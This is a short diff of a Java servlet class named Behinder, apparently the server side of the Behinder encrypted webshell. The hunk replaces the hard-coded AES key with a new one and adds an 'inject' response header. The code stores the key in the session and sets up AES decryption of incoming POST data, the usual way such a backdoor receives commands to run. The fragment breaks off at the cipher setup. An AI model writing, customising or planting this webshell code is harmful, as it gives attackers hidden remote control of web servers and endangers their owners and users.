@@ -23,10 +23,10 @@ public class Behinder extends HttpServlet{
 
 	@Override
 	protected void doPost(HttpServletRequest req, HttpServletResponse rsp)  {
-		rsp.setHeader("X-Geo-Country","*");
+		rsp.setHeader("inject","true");
 		try {
 			if (req.getMethod().equals("POST")) {
-				String k = "f5d7aa3ba4929cc1";
+				String k = "a2ad9b4babbba7e9";
 				req.getSession().setAttribute("u", k);
 				javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
 				c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), "AES"));
